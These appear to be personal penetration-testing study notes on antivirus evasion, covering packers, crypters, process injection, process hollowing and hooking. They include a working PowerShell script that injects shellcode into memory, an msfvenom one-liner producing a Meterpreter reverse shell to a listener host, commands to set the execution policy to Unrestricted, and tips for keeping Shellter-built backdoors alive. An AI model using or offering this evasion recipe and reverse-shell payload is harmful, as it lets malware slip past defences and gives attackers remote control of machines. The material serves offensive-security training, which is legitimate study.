AV Evasion:
Two kinds of AV Evasion: On-Disk and In-Memory.
In memory is the cooler kind that is going to be more useful
in the future.

On-Disk Evasion Methods:
Packers create functionally equivalent executables with different binary
structures. These also reduce the size of the file. Bypasses signature
AV, sometimes. upx is a popular packer.

Obfuscator reorganize code so it's harder to reverse. It will replace
instructions with semantically equivalent ones and add dead code.
Functions will also be split and reordered. Typically used as an IP
protection tool by devs, not very useful for AV sigs but can help if
you're desperate.

Crypters will cryptographically alter executable code. They add decrypting stubs at the
end of a program which will trigger decryption upon execution. This way,
the binary enters with one sig and then execuates as originally planned.
Because it's in the executable, the decryption happens in memory meaning
the malware is still encoded on disk. This is currently S-Tier sig evasion.

Software Protectors like The Enigma Protector can be used to evade AV as well
but they aren't great. Try to find one that covers anti-reversing, anti-debugging
and vm emulation detection. Covering as many bases as possible will help you.

In-Memory Evasion Methods:
Also known as PE Injections, In-Memory injections are very popular as an AVE tech.
These techs are so hot right now because they don't touch the disk aka no artefacts.

C and CPP are popular langs for writing these kinds of tools, but you can also do
PE Injections in PowerShell if the right conditions are met. Here are 4 ways:

Remote Process Memory Injection:
This is when you try to place a payload inside a valid, non-malicious PE. Leveraging
Windows APIs are the easiest way to do this. Using OpenProcess to obtain a valid
HANDLE lets us target a process. After getting the handle, you allocate extra memory to
the process using VirtualAllocEx or similar. Then you just copy the payload to the
new memory using WriteProcessMemory. Typically you then execute in a separate thread
using CreateRemoteThread.

Reflective DLL Injection:
Regular DLL Injection loads a malicious DLL from disk using LoadLibrary.
Reflective DLL Injection tries to do this from memory but there is no
Windows support for this so if you want to do it you have to roll
your own API to support in-memory DLLs.

Process Hollowing:
Launch a valid process in a suspended state, then remove the process image
from memory and replace it with the malicious process. Unsuspending
the process will then execute the malware posted at the address.

Inline Hooking,
Modifying memory to introduce a hook that redirects code execution into a
function to point the execution flow to malware. After execution, the flow
returns to normal, so it will look like the valid program executed cleanly.


EXAMPLE:
Windows machine, binary.exe is the malware and AV catches it on launch.
To solve, we have to perform an In-Memory Injection using PowerShell.

Here is a basic IMIPS script:
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc =
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

The [D] lines are imports of things we need. memset lets us write arbitrary data to allocated mem.

The shellcode gets placed in the Byte variable, and we can cook some up using msfvenom 1liners:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell

Throw that comma-separated byte code into the buffer. At this point the only thing stopping you
will be the execution policy. This policy can be by system, user, GPO or something else it's up
to you to enumerate it sufficiently.

Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

We should now be able to set up a listener and catch the shell from our malicious code.


SHELLTER:
This is a dynamic shellcode injection tool that's popular. It basically backdoors
valid processes for you. It is designed to run on Windows, so install wine if you're
using it on Linux to build malware. Can be installed with apt.

If you build with shellter, it is likely you will encounter an issue where your PE
cuts your shell when it closes. To fix this, catch with msfconsole and use the
set AutoRunScript post/windows/manage/migrate to move your session off the PE before
it closes.
